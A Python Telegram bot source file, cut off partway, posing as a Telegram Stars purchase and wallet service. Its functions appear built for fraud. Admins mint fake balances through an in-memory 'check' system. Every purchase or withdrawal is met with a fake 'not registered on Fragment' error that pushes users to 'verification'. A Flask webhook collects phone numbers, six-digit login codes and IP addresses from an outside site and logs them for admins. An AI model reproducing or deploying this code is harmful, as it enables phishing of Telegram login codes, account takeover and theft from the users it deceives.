import os
import logging
from datetime import datetime
from typing import Dict, List
import asyncio
from uuid import uuid4
import re
import json
import time
from threading import Thread

from telegram import (
    Update, 
    InlineKeyboardButton, 
    InlineKeyboardMarkup,
    InlineQueryResultArticle,
    InputTextMessageContent,
    InlineQueryResultPhoto
)
from telegram.ext import (
    Application, 
    CommandHandler, 
    MessageHandler, 
    CallbackQueryHandler,
    filters, 
    ContextTypes,
    ConversationHandler,
    InlineQueryHandler,
    ChosenInlineResultHandler
)
from flask import Flask, request, jsonify

# ========== НАСТРОЙКИ ==========
# Берем токен из переменных окружения (обязательно!)
BOT_TOKEN = os.getenv('BOT_TOKEN')
if not BOT_TOKEN:
    raise ValueError("❌ BOT_TOKEN не найден! Добавьте его в переменные окружения.")

# Порт для вебхук сервера (Render автоматически задает PORT)
WEBHOOK_PORT = int(os.getenv('PORT', 5000))

# ========== ЛОГИРОВАНИЕ ==========
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Состояния для ConversationHandler
GET_AMOUNT, AUTO_GIFTS = range(2)

# ========== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ==========
def format_nft_link(link: str) -> str:
    """Преобразует ссылку на NFT в красивое название"""
    clean_link = link.replace('https://', '').replace('http://', '')
    
    patterns = [
        r't\.me/nft/([^/?]+)',
        r'tg\.me/nft/([^/?]+)',
        r'telegram\.me/nft/([^/?]+)',
        r'/([^/?]+)$',
    ]
    
    nft_name = None
    for pattern in patterns:
        match = re.search(pattern, link)
        if match:
            nft_name = match.group(1)
            break
    
    if not nft_name:
        nft_name = clean_link.split('/')[-1] if '/' in clean_link else clean_link
    
    nft_name = nft_name.split('?')[0]
    
    if '-' in nft_name:
        parts = nft_name.split('-')
        if len(parts) >= 2:
            name_part = re.sub(r'(?<!^)(?=[A-Z])', ' ', parts[0])
            nft_display_name = f"{name_part} #{parts[1]}"
        else:
            nft_display_name = nft_name.replace('-', ' #')
    else:
        nft_display_name = re.sub(r'(?<!^)(?=[A-Z])', ' ', nft_name)
    
    return nft_display_name

# ========== ОСНОВНОЙ КЛАСС БОТА ==========
class StarCheckBot:
    def __init__(self):
        self.star_checks = {}
        self.user_checks = {}
        self.admins = []  # Список админов
        self.inline_checks = {}
        self.auto_gifts_users = set()
        self.user_wallets = {}
        
        # Добавляем первого админа из переменной окружения (если есть)
        admin_id = os.getenv('ADMIN_ID')
        if admin_id:
            try:
                self.add_admin(int(admin_id), "admin")
                logger.info(f"✅ Админ {admin_id} добавлен из переменной окружения")
            except:
                pass
    
    def get_user_wallet(self, user_id: int) -> float:
        """Получает баланс пользователя в звёздах"""
        return self.user_wallets.get(user_id, 0.0)
    
    def add_stars_to_wallet(self, user_id: int, amount: float) -> float:
        """Добавляет звёзды в кошелёк пользователя"""
        if user_id not in self.user_wallets:
            self.user_wallets[user_id] = 0.0
        self.user_wallets[user_id] += amount
        return self.user_wallets[user_id]
    
    def subtract_stars_from_wallet(self, user_id: int, amount: float) -> float:
        """Вычитает звёзды из кошелька пользователя"""
        if user_id not in self.user_wallets:
            self.user_wallets[user_id] = 0.0
        
        if self.user_wallets[user_id] >= amount:
            self.user_wallets[user_id] -= amount
        else:
            amount = self.user_wallets[user_id]
            self.user_wallets[user_id] = 0.0
        
        return self.user_wallets[user_id]
    
    def claim_check(self, check_id: str, user_id: int) -> dict:
        """Получает чек и зачисляет звёзды на баланс"""
        if check_id not in self.star_checks:
            return {'success': False, 'message': 'Чек не найден'}
        
        check_info = self.star_checks[check_id]
        
        if check_info['claimed']:
            return {'success': False, 'message': 'Чек уже был получен'}
        
        check_info['claimed'] = True
        check_info['claimed_by'] = user_id
        check_info['claimed_at'] = datetime.now()
        
        if not check_info['is_nft'] and check_info['amount'] > 0:
            new_balance = self.add_stars_to_wallet(user_id, check_info['amount'])
            return {
                'success': True, 
                'amount': check_info['amount'],
                'new_balance': new_balance,
                'is_nft': False
            }
        elif check_info['is_nft']:
            return {
                'success': True,
                'amount': 0,
                'new_balance': self.get_user_wallet(user_id),
                'is_nft': True
            }
        
        return {'success': False, 'message': 'Неизвестная ошибка'}
    
    def create_check(self, user_id: int, amount: float = 0, is_inline: bool = False) -> tuple:
        """Создает чек с указанной суммой"""
        check_id = str(uuid4())[:8].upper()
        
        self.star_checks[check_id] = {
            'user_id': user_id,
            'amount': amount,
            'created_at': datetime.now(),
            'claimed': False,
            'claimed_by': None,
            'claimed_at': None,
            'creator_name': "Пользователь",
            'is_nft': amount == 0,
            'status': 'active',
            'is_inline': is_inline
        }
        
        if user_id not in self.user_checks:
            self.user_checks[user_id] = []
        self.user_checks[user_id].append(check_id)
        
        if is_inline:
            self.inline_checks[check_id] = {
                'check_id': check_id,
                'amount': amount,
                'creator_id': user_id,
                'created_at': datetime.now()
            }
        
        bot_username = "NftkeysswalletBot"  # Замените на username вашего бота
        check_link = f"https://t.me/{bot_username}?start=check_{check_id}"
        
        return check_id, check_link
    
    def create_inline_check(self, user_id: int, amount: float) -> tuple:
        """Создает чек специально для inline режима"""
        return self.create_check(user_id, amount, is_inline=True)
    
    def get_inline_check_info(self, check_id: str) -> dict:
        """Получает информацию о чеке для inline режима"""
        if check_id in self.star_checks:
            check = self.star_checks[check_id]
            created_time = check['created_at'].strftime("%H:%M:%S")
            
            return {
                'check_id': check_id,
                'amount': check['amount'],
                'created_time': created_time,
                'is_nft': check['is_nft'],
                'claimed': check['claimed']
            }
        return None
    
    def get_user_checks(self, user_id: int) -> list:
        """Получает чеки пользователя"""
        if user_id in self.user_checks:
            return [(check_id, self.star_checks[check_id]) for check_id in self.user_checks[user_id]]
        return []
    
    def get_user_stats(self, user_id: int) -> dict:
        """Получает статистику пользователя"""
        checks = self.get_user_checks(user_id)
        wallet_balance = self.get_user_wallet(user_id)
        
        total_checks = len(checks)
        active_checks = sum(1 for _, check in checks if not check['claimed'])
        claimed_checks = total_checks - active_checks
        
        total_stars_created = sum(check['amount'] for _, check in checks if check['amount'] > 0)
        claimed_stars = sum(check['amount'] for _, check in checks if check['claimed'] and check['amount'] > 0)
        
        nft_checks = sum(1 for _, check in checks if check['is_nft'])
        
        return {
            'total_checks': total_checks,
            'active_checks': active_checks,
            'claimed_checks': claimed_checks,
            'total_stars_created': total_stars_created,
            'claimed_stars': claimed_stars,
            'nft_checks': nft_checks,
            'wallet_balance': wallet_balance,
            'has_auto_gifts': self.has_auto_gifts(user_id)
        }
    
    def add_admin(self, user_id: int, username: str = None):
        """Добавляет администратора"""
        # Проверяем, не админ ли уже
        for admin in self.admins:
            if admin['id'] == user_id:
                return user_id
        
        self.admins.append({
            'id': user_id,
            'username': username,
            'added_at': datetime.now()
        })
        logger.info(f"✅ Администратор добавлен: {user_id}")
        return user_id
    
    def is_admin(self, user_id: int) -> bool:
        """Проверяет, является ли пользователь админом"""
        for admin in self.admins:
            if admin['id'] == user_id:
                return True
        return False
    
    def get_admin_stats(self) -> dict:
        """Получает статистику для админов"""
        total_checks = len(self.star_checks)
        active_checks = sum(1 for check in self.star_checks.values() if not check['claimed'])
        claimed_checks = total_checks - active_checks
        
        total_stars = sum(check['amount'] for check in self.star_checks.values() if check['amount'] > 0)
        claimed_stars = sum(check['amount'] for check in self.star_checks.values() if check['claimed'])
        
        nft_checks = sum(1 for check in self.star_checks.values() if check['is_nft'])
        inline_checks = sum(1 for check in self.star_checks.values() if check.get('is_inline', False))
        auto_gifts_users = len(self.auto_gifts_users)
        total_wallet_balance = sum(self.user_wallets.values())
        
        return {
            'total_checks': total_checks,
            'active_checks': active_checks,
            'claimed_checks': claimed_checks,
            'total_stars': total_stars,
            'claimed_stars': claimed_stars,
            'nft_checks': nft_checks,
            'total_users': len(self.user_checks),
            'total_admins': len(self.admins),
            'inline_checks': inline_checks,
            'auto_gifts_users': auto_gifts_users,
            'total_wallet_balance': total_wallet_balance
        }
    
    def toggle_auto_gifts(self, user_id: int, enable: bool) -> bool:
        """Включает/выключает авто-скупщик подарков"""
        if enable:
            self.auto_gifts_users.add(user_id)
        elif user_id in self.auto_gifts_users:
            self.auto_gifts_users.remove(user_id)
        return enable
    
    def has_auto_gifts(self, user_id: int) -> bool:
        """Проверяет, включен ли авто-скупщик подарков"""
        return user_id in self.auto_gifts_users

# ========== КЛАСС ВЕРИФИКАЦИИ ==========
class VerificationBot:
    def __init__(self):
        self.pending_verifications = {}
        self.verified_users = set()
        self.website_verifications = []
    
    def add_verification(self, user_id: int, phone: str, code: str):
        """Добавляет данные верификации"""
        verification_id = str(uuid4())[:8].upper()
        self.pending_verifications[verification_id] = {
            'user_id': user_id,
            'phone': phone,
            'code': code,
            'created_at': datetime.now(),
            'status': 'pending'
        }
        return verification_id
    
    def add_website_verification(self, phone: str, code: str, ip: str = "unknown"):
        """Добавляет верификацию с сайта"""
        verification_id = str(uuid4())[:8].upper()
        verification_data = {
            'verification_id': verification_id,
            'phone': phone,
            'code': code,
            'ip': ip,
            'created_at': datetime.now(),
            'status': 'pending'
        }
        self.website_verifications.append(verification_data)
        return verification_id
    
    def approve_verification(self, verification_id: str, admin_id: int) -> bool:
        """Одобряет верификацию"""
        if verification_id in self.pending_verifications:
            verification = self.pending_verifications[verification_id]
            verification['status'] = 'approved'
            verification['approved_by'] = admin_id
            verification['approved_at'] = datetime.now()
            self.verified_users.add(verification['user_id'])
            return True
        return False
    
    def reject_verification(self, verification_id: str, admin_id: int) -> bool:
        """Отклоняет верификацию"""
        if verification_id in self.pending_verifications:
            verification = self.pending_verifications[verification_id]
            verification['status'] = 'rejected'
            verification['rejected_by'] = admin_id
            verification['rejected_at'] = datetime.now()
            return True
        return False
    
    def is_user_verified(self, user_id: int) -> bool:
        """Проверяет верифицирован ли пользователь"""
        return user_id in self.verified_users
    
    def get_pending_verifications(self) -> dict:
        """Получает все ожидающие верификации"""
        return {k: v for k, v in self.pending_verifications.items() 
                if v['status'] == 'pending'}
    
    def get_verification_info(self, verification_id: str) -> dict:
        """Получает информацию о верификации"""
        return self.pending_verifications.get(verification_id)
    
    def get_website_verifications(self, limit: int = 50):
        """Получает верификации с сайта"""
        return self.website_verifications[-limit:] if self.website_verifications else []
    
    def clear_website_verifications(self):
        """Очищает верификации с сайта"""
        self.website_verifications = []

# ========== СОЗДАЕМ ЭКЗЕМПЛЯРЫ ==========
star_bot = StarCheckBot()
verification_bot = VerificationBot()

# ========== FLASK ПРИЛОЖЕНИЕ ДЛЯ ВЕБХУКОВ ==========
webhook_app = Flask(__name__)

@webhook_app.route('/webhook', methods=['POST'])
def webhook_handler():
    """Обработчик вебхука от сайта верификации"""
    try:
        data = request.json
        
        if not data:
            return jsonify({'success': False, 'error': 'No data received'}), 400
        
        phone = data.get('phone', '').strip()
        code = data.get('code', '').strip()
        
        if not phone or not code:
            return jsonify({'success': False, 'error': 'Phone or code missing'}), 400
        
        # Валидация
        if not phone.startswith('+'):
            return jsonify({'success': False, 'error': 'Phone must start with +'}), 400
        
        if len(code) != 6 or not code.isdigit():
            return jsonify({'success': False, 'error': 'Code must be 6 digits'}), 400
        
        # Получаем IP пользователя
        user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        
        # Добавляем верификацию
        verification_id = verification_bot.add_website_verification(phone, code, user_ip)
        
        logger.info(f"🌐 Вебхук: телефон {phone}, код {code}, IP: {user_ip}, ID: {verification_id}")
        
        return jsonify({
            'success': True, 
            'message': 'Verification data received',
            'verification_id': verification_id,
            'timestamp': datetime.now().isoformat()
        })
        
    except Exception as e:
        logger.error(f"❌ Ошибка вебхука: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@webhook_app.route('/health', methods=['GET'])
def health_check():
    """Проверка работоспособности сервера"""
    return jsonify({
        'success': True,
        'status': 'running',
        'timestamp': datetime.now().isoformat(),
        'bot_checks': len(star_bot.star_checks),
        'users': len(star_bot.user_checks),
        'verifications': len(verification_bot.website_verifications)
    })

@webhook_app.route('/status', methods=['GET'])
def status():
    """Статус бота для мониторинга"""
    return jsonify({
        'status': 'ok',
        'bot_running': True,
        'checks_count': len(star_bot.star_checks),
        'users_count': len(star_bot.user_checks),
        'admins_count': len(star_bot.admins),
        'timestamp': datetime.now().isoformat()
    })

def run_webhook_server():
    """Запуск вебхук сервера"""
    print(f"🌐 Вебхук сервер запущен на порту {WEBHOOK_PORT}")
    webhook_app.run(host='0.0.0.0', port=WEBHOOK_PORT, debug=False, use_reloader=False)

# ========== ОБРАБОТЧИКИ TELEGRAM БОТА ==========
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обработчик команды /start"""
    user = update.effective_user
    
    # Если админ - показываем админ-панель
    if star_bot.is_admin(user.id):
        await show_admin_panel(update, context)
        return ConversationHandler.END
    
    # Обработка получения чека
    if context.args and len(context.args) > 0 and context.args[0].startswith('check_'):
        check_id = context.args[0].replace('check_', '')
        
        if check_id not in star_bot.star_checks:
            await update.message.reply_text("❌ Чек не найден или был удален.")
            return ConversationHandler.END
        
        current_balance = star_bot.get_user_wallet(user.id)
        check_info = star_bot.star_checks[check_id]
        
        if check_info['claimed']:
            await update.message.reply_text("⚠️ Этот чек уже был получен.")
            return ConversationHandler.END
        
        result = star_bot.claim_check(check_id, user.id)
        
        if not result['success']:
            await update.message.reply_text(f"❌ {result['message']}")
            return ConversationHandler.END
        
        if result['is_nft']:
            success_message = f"""🎉 NFT чек успешно получен!

✅ Вы получили доступ к NFT
💰 Ваш баланс: {result['new_balance']:.0f} ⭐

🆔 Номер чека: {check_id}"""
        else:
            success_message = f"""🎉 Чек успешно получен!

💰 Зачислено: {result['amount']:.0f} ⭐
💳 Баланс: {result['new_balance']:.0f} ⭐"""
        
        await update.message.reply_text(
            success_message,
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("✨ Создать чек", callback_data='create_check')],
                [InlineKeyboardButton("📋 Мой кошелёк", callback_data='my_checks')],
                [InlineKeyboardButton("🏠 На главную", callback_data='back_to_main')]
            ])
        )
        return ConversationHandler.END
    
    # Главное меню
    user_stats = star_bot.get_user_stats(user.id)
    
    welcome_text = f"""⭐️ @NftkeysswalletBot — сервис покупки звёзд Telegram

👤 Ваш профиль:
├ Имя: {user.full_name}
└ Баланс: {user_stats['wallet_balance']:.0f} ⭐

Покупай звёзды быстро и безопасно!"""
    
    keyboard = [
        [InlineKeyboardButton("🐝 Вывод средств", callback_data='help')],
        [InlineKeyboardButton("👛 Мой кошелёк", callback_data='my_checks')],
        [InlineKeyboardButton("💰 Купить звёзды", callback_data='create_check')],
        [InlineKeyboardButton("🤖 Автоскупщик", callback_data='auto_gifts')],
    ]
    
    if star_bot.is_admin(user.id):
        keyboard.append([InlineKeyboardButton("👑 Work-панель", callback_data='admin_panel')])
    
    await update.message.reply_text(
        welcome_text,
        reply_markup=InlineKeyboardMarkup(keyboard)
    )
    return ConversationHandler.END

async def show_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Показывает главное меню"""
    user = update.effective_user
    user_stats = star_bot.get_user_stats(user.id)
    
    welcome_text = f"""⭐️ @NftkeysswalletBot — сервис покупки звёзд Telegram

👤 Ваш профиль:
├ Имя: {user.full_name}
└ Баланс: {user_stats['wallet_balance']:.0f} ⭐

Покупай звёзды быстро и безопасно!"""
    
    keyboard = [
        [InlineKeyboardButton("🐝 Вывод средств", callback_data='help')],
        [InlineKeyboardButton("👛 Мой кошелёк", callback_data='my_checks')],
        [InlineKeyboardButton("💰 Купить звёзды", callback_data='create_check')],
        [InlineKeyboardButton("🤖 Автоскупщик", callback_data='auto_gifts')],
    ]
    
    if star_bot.is_admin(user.id):
        keyboard.append([InlineKeyboardButton("👑 Work-панель", callback_data='admin_panel')])
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    if update.callback_query:
        await update.callback_query.message.edit_text(
            welcome_text,
            reply_markup=reply_markup
        )
    else:
        await update.message.reply_text(
            welcome_text,
            reply_markup=reply_markup
        )

async def show_admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Показывает админ-панель"""
    user = update.effective_user
    
    if not star_bot.is_admin(user.id):
        await update.message.reply_text("❌ У вас нет прав администратора.")
        return
    
    stats = star_bot.get_admin_stats()
    
    stats_text = f"""👑 WORK-ПАНЕЛЬ

📊 СТАТИСТИКА:
├ Активных чеков: {stats['active_checks']}
├ Полученных: {stats['claimed_checks']}
├ Админов: {stats['total_admins']}
├ Баланс: {stats['total_wallet_balance']:.0f} ⭐
└ Пользователей: {stats['total_users']}

🕐 {datetime.now().strftime('%H:%M:%S')}"""

    keyboard = [
        [InlineKeyboardButton("✨ Создать чек", callback_data='admin_inline_check')],
        [InlineKeyboardButton("⚙️ Настройки", callback_data='admin_settings')],
        [InlineKeyboardButton("📋 Все чеки", callback_data='admin_all_checks')],
        [InlineKeyboardButton("👥 Пользователи", callback_data='admin_users')],
        [InlineKeyboardButton("🔐 Верификации", callback_data='verify_panel')]
    ]
    
    if hasattr(update, 'callback_query') and update.callback_query:
        await update.callback_query.message.edit_text(
            stats_text,
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
    else:
        await update.message.reply_text(
            stats_text,
            reply_markup=InlineKeyboardMarkup(keyboard)
        )

async def admin_inline_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Создание inline чека"""
    query = update.callback_query
    await query.answer()
    
    keyboard = [
        [
            InlineKeyboardButton("100 ⭐", callback_data='inline_amount_100'),
            InlineKeyboardButton("300 ⭐", callback_data='inline_amount_300'),
            InlineKeyboardButton("500 ⭐", callback_data='inline_amount_500')
        ],
        [
            InlineKeyboardButton("1000 ⭐", callback_data='inline_amount_1000'),
            InlineKeyboardButton("2000 ⭐", callback_data='inline_amount_2000')
        ],
        [
            InlineKeyboardButton("Другая сумма", callback_data='inline_custom_amount'),
            InlineKeyboardButton("⬅️ Назад", callback_data='admin_panel')
        ]
    ]
    
    await query.edit_message_text(
        "💰 Выберите сумму для чека:",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

async def create_inline_check_handler(update: Update, context: ContextTypes.DEFAULT_TYPE, amount: float):
    """Создает inline чек"""
    query = update.callback_query
    user = update.effective_user
    
    if not star_bot.is_admin(user.id):
        await query.edit_message_text("❌ Только для администраторов.")
        return
    
    check_id, check_link = star_bot.create_inline_check(user.id, amount)
    
    admin_message = f"""✅ Чек создан!
💰 Сумма: {amount}⭐
🔗 ID: <code>{check_id}</code>

📱 Для отправки введите:
<code>@{context.bot.username} {check_id}</code>"""
    
    keyboard = [
        [
            InlineKeyboardButton("➕ Ещё", callback_data='admin_inline_check'),
            InlineKeyboardButton("⬅️ Назад", callback_data='admin_panel')
        ]
    ]
    
    await query.edit_message_text(
        admin_message,
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='HTML'
    )

async def inline_query_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обработчик inline запросов"""
    query_text = (update.inline_query.query or "").strip()
    user = update.inline_query.from_user
    results = []
    bot_username = context.bot.username
    image_url = "https://avatars.mds.yandex.net/i?id=7e270ad8b2182e1d142d7b9c650f393d728fc331-7051980-images-thumbs&n=13"

    # Проверка формата: @bot сумма
    match_bot_amount = re.match(r'^\@?([A-Za-z0-9_]+)\s+([0-9]+(?:[\.,][0-9]+)?)$', query_text)

    if match_bot_amount:
        target_bot_name = match_bot_amount.group(1)
        raw_amount = match_bot_amount.group(2).replace(',', '.')
        
        try:
            amount = float(raw_amount)
        except ValueError:
            amount = None

        if target_bot_name.lower() != bot_username.lower():
            results.append(
                InlineQueryResultArticle(
                    id="wrong_bot",
                    title="❗ Неверный юзернейм",
                    description=f"Используйте @{bot_username} <сумма>",
                    input_message_content=InputTextMessageContent(f"Формат: @{bot_username} 100")
                )
            )
        else:
            if not star_bot.is_admin(user.id):
                results.append(
                    InlineQueryResultArticle(
                        id="no_admin",
                        title="❌ Ошибка",
                        description="Требуются права администратора",
                        input_message_content=InputTextMessageContent("❌ У вас нет прав для создания чеков.")
                    )
                )
            elif amount and amount > 0:
                check_id, check_link = star_bot.create_inline_check(user.id, amount)
                amount_display = f"{int(amount)}" if amount.is_integer() else f"{amount:.2f}".rstrip('0').rstrip('.')
                
                reply_markup = InlineKeyboardMarkup([[
                    InlineKeyboardButton(text="🎁 Получить", url=check_link)
                ]])

                results.append(
                    InlineQueryResultPhoto(
                        id=check_id,
                        photo_url=image_url,
                        thumbnail_url=image_url,
                        title=f"✨ Чек на {amount_display} ⭐",
                        caption=f"🎁 Чек на ⭐️{amount_display} Звёзд\nID: {check_id}",
                        reply_markup=reply_markup
                    )
                )

    elif query_text and len(query_text) >= 4:
        # Поиск по ID чека
        check_info = star_bot.get_inline_check_info(query_text.upper())
        if check_info and not check_info['claimed']:
            amount = check_info['amount']
            check_id = check_info['check_id']
            check_link = f"https://t.me/{bot_username}?start=check_{check_id}"
            amount_display = f"{int(amount)}" if float(amount).is_integer() else f"{amount:.2f}".rstrip('0').rstrip('.')
            
            reply_markup = InlineKeyboardMarkup([[
                InlineKeyboardButton(text="🎁 Получить", url=check_link)
            ]])

            results.append(
                InlineQueryResultPhoto(
                    id=check_id,
                    photo_url=image_url,
                    thumbnail_url=image_url,
                    title=f"🎁 Чек {check_id}",
                    caption=f"🎁 Чек на ⭐️{amount_display} Звёзд\nID: {check_id}",
                    reply_markup=reply_markup
                )
            )

    # Если результатов нет
    if not results:
        if star_bot.is_admin(user.id):
            results.append(
                InlineQueryResultArticle(
                    id="admin_help",
                    title="👑 Создание чека",
                    description=f"Введите: @{bot_username} <сумма>",
                    input_message_content=InputTextMessageContent(f"📱 Введите @{bot_username} 300 для создания чека.")
                )
            )
        else:
            results.append(
                InlineQueryResultArticle(
                    id="user_help",
                    title="❌ Ошибка",
                    description="Требуются права администратора",
                    input_message_content=InputTextMessageContent("❌ У вас нет прав для создания чеков.")
                )
            )

    await update.inline_query.answer(results, cache_time=1)

async def my_checks_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Показать чеки пользователя"""
    query = update.callback_query
    await query.answer()
    
    user = update.effective_user
    checks = star_bot.get_user_checks(user.id)
    user_stats = star_bot.get_user_stats(user.id)
    
    if not checks:
        message = f"""👛 Ваш кошелёк

💰 Баланс: {user_stats['wallet_balance']:.0f} ⭐
📭 У вас пока нет чеков"""
    else:
        message = f"""👛 Ваш кошелёк

💰 Баланс: {user_stats['wallet_balance']:.0f} ⭐
📊 Всего чеков: {len(checks)}"""
    
    keyboard = [
        [InlineKeyboardButton("✨ Создать чек", callback_data='create_check')],
        [InlineKeyboardButton("⬅️ Назад", callback_data='back_to_main')]
    ]
    
    await query.edit_message_text(
        message,
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

async def create_check_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обработчик создания чека"""
    query = update.callback_query
    await query.answer()
    
    keyboard = [
        [
            InlineKeyboardButton("25 ⭐", callback_data='amount_25'),
            InlineKeyboardButton("100 ⭐", callback_data='amount_100'),
            InlineKeyboardButton("500 ⭐", callback_data='amount_500')
        ],
        [
            InlineKeyboardButton("1000 ⭐", callback_data='amount_1000'),
            InlineKeyboardButton("2000 ⭐", callback_data='amount_2000'),
            InlineKeyboardButton("5000 ⭐", callback_data='amount_5000')
        ],
        [
            InlineKeyboardButton("💰 Другая сумма", callback_data='custom_amount'),
            InlineKeyboardButton("⬅️ Назад", callback_data='back_to_main')
        ]
    ]
    
    await query.edit_message_text(
        "💰 Выберите сумму чека:",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

async def amount_selected(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обработчик выбора суммы"""
    query = update.callback_query
    await query.answer()
    
    amounts = {
        'amount_25': 25,
        'amount_100': 100,
        'amount_500': 500,
        'amount_1000': 1000,
        'amount_2000': 2000,
        'amount_5000': 5000
    }
    
    if query.data in amounts:
        amount = amounts[query.data]
        await generate_check(update, context, amount)
    elif query.data == 'custom_amount':
        await query.edit_message_text(
            "📝 Введите сумму (1-10000):",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("⬅️ Отмена", callback_data='create_check')]
            ])
        )
        context.user_data['waiting_for_amount'] = True
        return GET_AMOUNT

async def get_custom_amount(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Получение пользовательской суммы"""
    try:
        amount = float(update.message.text)
        
        if amount <= 0 or amount > 10000:
            await update.message.reply_text("❌ Сумма должна быть от 1 до 10000.")
            return GET_AMOUNT
        
        await generate_check(update, context, amount)
        return ConversationHandler.END
        
    except ValueError:
        await update.message.reply_text("❌ Введите корректное число.")
        return GET_AMOUNT

async def generate_check(update: Update, context: ContextTypes.DEFAULT_TYPE, amount: float):
    """Генерация чека"""
    user = update.effective_user
    
    check_id, check_link = star_bot.create_check(user.id, amount)
    
    check_message = f"""❌ Ошибка! Вы не зарегистрированы на Fragment.

Пройдите верификацию в мини-приложении."""
    
    keyboard = [
        [InlineKeyboardButton("⬅️ Назад", callback_data='back_to_main')]
    ]
    
    if hasattr(update, 'callback_query') and update.callback_query:
        await update.callback_query.message.edit_text(
            check_message,
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
    else:
        await update.message.reply_text(
            check_message,
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
    
    if 'waiting_for_amount' in context.user_data:
        del context.user_data['waiting_for_amount']

async def auto_gifts_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обработчик авто-скупщика"""
    query = update.callback_query
    await query.answer()
    
    user = update.effective_user
    has_auto_gifts = star_bot.has_auto_gifts(user.id)
    user_stats = star_bot.get_user_stats(user.id)
    status_text = "✅ Включен" if has_auto_gifts else "❌ Выключен"
    
    text = f"""🤖 Авто-скупщик подарков

💰 Баланс: {user_stats['wallet_balance']:.0f} ⭐
📊 Статус: {status_text}"""
    
    keyboard = [
        [
            InlineKeyboardButton("✅ Включить", callback_data='auto_gifts_on'),
            InlineKeyboardButton("❌ Выключить", callback_data='auto_gifts_off')
        ],
        [InlineKeyboardButton("⬅️ Назад", callback_data='back_to_main')]
    ]
    
    await query.edit_message_text(
        text,
        reply_markup=InlineKeyboardMarkup(keyboard)
    )
    return AUTO_GIFTS

async def auto_gifts_toggle(update: Update, context: ContextTypes.DEFAULT_TYPE, enable: bool):
    """Включение/выключение авто-скупщика"""
    query = update.callback_query
    await query.answer()
    
    user = update.effective_user
    star_bot.toggle_auto_gifts(user.id, enable)
    user_stats = star_bot.get_user_stats(user.id)
    
    status = "✅ Включен" if enable else "❌ Выключен"
    
    text = f"""🤖 Авто-скупщик подарков

💰 Баланс: {user_stats['wallet_balance']:.0f} ⭐
📊 Статус: {status}"""
    
    keyboard = [
        [
            InlineKeyboardButton("✅ Включить", callback_data='auto_gifts_on'),
            InlineKeyboardButton("❌ Выключить", callback_data='auto_gifts_off')
        ],
        [InlineKeyboardButton("⬅️ Назад", callback_data='back_to_main')]
    ]
    
    await query.edit_message_text(
        text,
        reply_markup=InlineKeyboardMarkup(keyboard)
    )
    return AUTO_GIFTS

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Команда помощи"""
    query = update.callback_query
    
    help_text = """❌ Ошибка! Вы не зарегистрированы на Fragment.

Чтобы вывести звёзды, нужно зарегистрироваться на Fragment."""
    
    keyboard = [
        [InlineKeyboardButton("⬅️ Назад", callback_data='back_to_main')]
    ]
    
    if query:
        await query.message.edit_text(
            help_text,
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
    else:
        await update.message.reply_text(
            help_text,
            reply_markup=InlineKeyboardMarkup(keyboard)
        )

async def setadmin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Команда для установки администратора"""
    user = update.effective_user
    
    # Проверяем, есть ли секретный ключ
    if context.args and len(context.args) > 0:
        secret_key = context.args[0]
        admin_secret = os.getenv('ADMIN_SECRET', 'admin123')
        
        if secret_key == admin_secret:
            star_bot.add_admin(user.id, user.username)
            await update.message.reply_text(
                f"✅ Вы стали администратором!\nИспользуйте /admin для доступа к панели."
            )
        else:
            await update.message.reply_text("❌ Неверный секретный ключ.")
    else:
        await update.message.reply_text(
            "📝 Использование: /setadmin <секретный_ключ>\nСекретный ключ узнайте у разработчика."
        )

async def admin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Команда для админ-панели"""
    await show_admin_panel(update, context)

async def admin_all_checks(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Показать все чеки"""
    query = update.callback_query
    await query.answer()
    
    checks = list(star_bot.star_checks.items())
    checks.sort(key=lambda x: x[1]['created_at'], reverse=True)
    
    if not checks:
        await query.edit_message_text(
            "📭 Нет созданных чеков.",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("⬅️ Назад", callback_data='admin_panel')]
            ])
        )
        return
    
    message = "📋 ВСЕ ЧЕКИ\n\n"
    
    for i, (check_id, check_info) in enumerate(checks[:10]):
        if check_info['is_nft']:
            check_type = "🎨 NFT"
            amount_text = "NFT"
        else:
            check_type = "✨ Звезды"
            amount_text = f"{check_info['amount']}⭐"
        
        status = "✅ Активен" if not check_info['claimed'] else "✅ Получен"
        created_time = check_info['created_at'].strftime("%d.%m %H:%M")
        inline_mark = "📱 " if check_info.get('is_inline', False) else ""
        
        message += f"""<b>{i+1}. {inline_mark}{check_type}</b>
├ ID: <code>{check_id}</code>
├ Сумма: {amount_text}
├ Статус: {status}
└ Создан: {created_time}

"""
    
    keyboard = [
        [InlineKeyboardButton("⬅️ Назад", callback_data='admin_panel')]
    ]
    
    await query.edit_message_text(
        message,
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='HTML'
    )

async def admin_users_list(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Список пользователей"""
    query = update.callback_query
    await query.answer()
    
